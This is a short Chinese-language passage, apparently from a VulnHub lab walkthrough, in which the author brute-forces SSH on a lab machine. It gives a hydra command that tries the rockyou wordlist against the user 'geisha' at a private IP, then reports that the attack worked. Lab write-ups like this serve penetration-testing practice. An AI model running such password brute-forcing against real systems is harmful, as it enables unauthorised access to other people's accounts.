## 获得权限

根据上面得到的用户名，爆破下ssh

```bash
$ hydra -l geisha -P /usr/share/wordlists/rockyou.txt -f 10.0.2.36 ssh
```

![2](https://static.iihack.com/vulnhub/481/2.jpg)

爆破成功
